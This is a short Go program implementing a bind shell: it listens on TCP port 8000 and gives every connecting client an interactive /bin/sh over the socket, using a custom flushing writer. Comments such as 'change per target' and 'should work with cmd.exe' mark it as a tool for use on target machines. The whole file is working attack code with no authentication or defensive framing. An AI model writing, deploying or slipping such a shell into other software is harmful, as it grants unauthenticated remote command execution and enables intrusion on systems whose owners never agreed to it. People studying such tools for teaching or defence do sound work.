package main

import (
  "net"
  "log"
  "os/exec"
  "bufio"
  "io"
)

type Flusher struct {
  w *bufio.Writer
}

func NewFlusher(w io.Writer) *Flusher {
  return &Flusher{
    w: bufio.NewWriter(w),
  }
}

func (foo *Flusher) Write(b []byte) (int, error) {
  count, err := foo.w.Write(b)
  if err != nil {
    return -1, err
  }
  if err := foo.w.Flush(); err != nil {
    return -1, err
  }
  return count, err
}


func main() {
  listener, err := net.Listen("tcp", ":8000")
  if err != nil {
    log.Fatalln("Bind to port failed")
  }

  for {
    conn, err := listener.Accept()
    if err != nil {
      log.Fatalln("Unable to accept connection")
    }
    cmd := exec.Command("/bin/sh", "-i")//change per target 
    cmd.Stdin = conn
    cmd.Stdout = NewFlusher(conn)  //should work with cmd.exe
    if err :=cmd.Run(); err != nil {
      log.Fatalln("error")
    }
  }
}
